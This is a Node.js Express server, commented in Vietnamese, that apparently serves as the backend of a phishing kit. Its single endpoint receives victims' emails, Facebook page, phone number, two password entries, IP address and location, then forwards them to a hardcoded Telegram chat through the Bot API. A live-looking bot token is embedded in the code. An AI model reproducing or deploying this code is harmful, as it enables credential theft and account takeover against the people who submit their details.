const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());

const PORT = 3000;

// Telegram Bot Token và Chat ID
const TELEGRAM_BOT_TOKEN = '7866940602:AAHDbByjkFtoX6lVo7SSlWfcFxfOfqaIvnw'; // Thay bằng token bot của bạn
const TELEGRAM_CHAT_ID = '7866940602'; // Thay bằng chat ID người dùng

// Endpoint POST để nhận thông tin từ FE
app.post('/api/user-info', async (req, res) => {
    const userInfo = req.body;

    // Format thông tin thành chuỗi để gửi
    const message = `
📧 *User Information Received*:
- Email1: ${userInfo.email1}
- User Name: ${userInfo.userName}
- Email2: ${userInfo.email2}
- Facebook Page: ${userInfo.facebookPage}
- Phone: ${userInfo.phone}
- First Password: ${userInfo.firstPassword}
- Second Password: ${userInfo.secondPassword}
- IP: ${userInfo.ip}
- Country: ${userInfo.country}
- City: ${userInfo.city}
    `;

    try {
        // Gửi tin nhắn qua Telegram
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown', // Định dạng tin nhắn
        });

        console.log('Message sent to Telegram:', response.data);

        res.json({
            message: 'User info received and sent to Telegram successfully',
            telegramResponse: response.data,
        });
    } catch (error) {
        console.error('Error sending message to Telegram:', error.message);

        res.status(500).json({
            message: 'Failed to send message to Telegram',
            error: error.message,
        });
    }
});

// Khởi động server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});